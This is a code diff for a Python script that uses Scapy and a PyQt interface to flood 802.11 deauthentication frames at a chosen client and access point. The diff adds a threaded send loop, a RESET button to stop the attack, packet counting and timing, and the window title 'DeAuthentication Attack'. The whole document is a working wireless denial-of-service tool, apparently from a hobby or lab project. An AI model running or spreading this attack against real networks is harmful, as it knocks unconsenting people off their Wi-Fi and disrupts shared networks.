@@ -7,13 +7,16 @@ from scapy.all import *
 from subprocess import call
 from subprocess import check_output
 import re
+import threading
+
 
 iface = "wlan0mon"
 timeout = 1
 #dest = "94:65:2D:D8:2E:16"
 #bssid = "40:F2:01:9A:42:56"
 
-
+resetflag = False
+packetcount = 1
 
 def setMonitorMode():
 	checkphrase_mon_success = "monitor mode vif enabled"
@@ -45,6 +48,7 @@ def perform_deauth_attack(interface,dest,bssid,amount):
 	:param bssid:
 	:return:
 	"""
+	global packetcount #ville gerne bare kunne returne packet count af funktionen aka. i værdien, i forloopet, men problemet er at den er nødt til at køre som en Thread.
 	radio_p = RadioTap()
 	dot11_frame = Dot11(subtype=0xc,addr1=dest,addr2=bssid,addr3=bssid) #0xc is hex for 12, and 1100 in integer (deuath sub type value)
 	deauth = Dot11Deauth(reason=3) #reason list, see 802.11 deauth reason codes,
@@ -55,7 +59,39 @@ def perform_deauth_attack(interface,dest,bssid,amount):
 	#ls(frame)
 	#frame.summary()
 
-	sendp(frame,iface=interface, count=amount,inter=0.02) #'wlan0mon'
+
+	#sendp(frame,iface=interface, count=amount,inter=0.1,verbose=False) #'wlan0mon' - set verbose true if you want to see packet output amount.
+	#print(end-start) #takes about 3.6 seconds to send 1000 packets at a speed of 0.0001
+	#sendpfast(frame,iface=interface,pps=1000,loop=amount,parse_results=1)
+
+	#sendp(frame, iface=interface, count=amount,inter=0.2,verbose=False)
+	#endTOTAL = time.time()
+	#print(endTOTAL - startTOTAL)
+
+	attack_timer = time.time()
+
+	for i in range(0,amount):
+		if resetflag == True:
+			#print("RESET BUTTON CLICKED")
+			#return "RESET BUTTON CLICKED"
+			break
+		else:
+			#start = time.time()
+			sendp(frame,iface=interface,verbose=False)
+			#end = time.time()
+			#print(end - start)
+			packetcount +=1
+
+	end_attack_timer = time.time()
+	total_attack_time = (end_attack_timer - attack_timer)
+	print("TOTAL TIME SPENT ON PACKETS SENT")
+	print(total_attack_time)
+	print("TOTAL PACKETS SENT: ")
+	print(packetcount)
+
+	#endTOTAL = time.time()
+	#print(endTOTAL - startTOTAL)  # takes about 40 seconds to send 1000 deuath packets in a for loop.
+
 
 
 setMonitorMode()
@@ -63,7 +99,7 @@ setMonitorMode()
 class App(QMainWindow):
 	def __init__(self):
 		super().__init__()
-		self.title = "hello there"
+		self.title = "DeAuthentication Attack"
 		self.setupUI()
 
 	def setupUI(self):
@@ -86,16 +122,25 @@ class App(QMainWindow):
 		##ATTACK button
 		self.attackbutton = QPushButton('ATTACK',self)
 		self.attackbutton.resize(200,50)
-		self.attackbutton.move(350,65)
+		self.attackbutton.move(350,30)
 		self.attackbutton.clicked.connect(self.on_attackclick)
 
-
-
+		##RESET BUTTON
+		self.resetbutton = QPushButton('RESET',self)
+		self.resetbutton.resize(200,50)
+		self.resetbutton.move(350,100)
+		self.resetbutton.clicked.connect(self.on_resetclick)
 
 
 		self.show()
+
+
+
 	@pyqtSlot()
 	def on_attackclick(self):
+		global resetflag
+		resetflag = False
+
 		self.textboxAP.setEnabled(False)
 		self.textbox.setEnabled(False)
 		bssid_targetMAC = self.textboxAP.text() #string
@@ -104,7 +149,11 @@ class App(QMainWindow):
 		print(destMAC)
 		matchexpr = "[0-9a-f]{2}([-:]?)[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$" #regex match
 		if re.match(matchexpr, bssid_targetMAC.lower()) and re.match(matchexpr,destMAC.lower()):#checks if both inputs are valid MAC addreses (just format)
-			perform_deauth_attack(iface, destMAC, bssid_targetMAC, 100000)
+
+			attackthread = threading.Thread(target=perform_deauth_attack, args=(iface,destMAC, bssid_targetMAC, 100))
+			attackthread.start()
+
+
 
 
 
@@ -115,6 +164,22 @@ class App(QMainWindow):
 			self.textbox.setEnabled(True)
 			self.textbox.clear()
 			self.textboxAP.clear()
+
+
+	@pyqtSlot()
+	def on_resetclick(self):
+		global resetflag
+		global packetcount
+		self.textbox.clear()
+		self.textboxAP.clear()
+		self.textboxAP.setEnabled(True)
+		self.textbox.setEnabled(True)
+		self.textboxAP.setPlaceholderText("Enter the target AP MAC address")
+		self.textbox.setPlaceholderText("Enter the target MAC address")
+		resetflag = True
+		packetcount = 0
+
+
 
 
 if __name__ == '__main__':
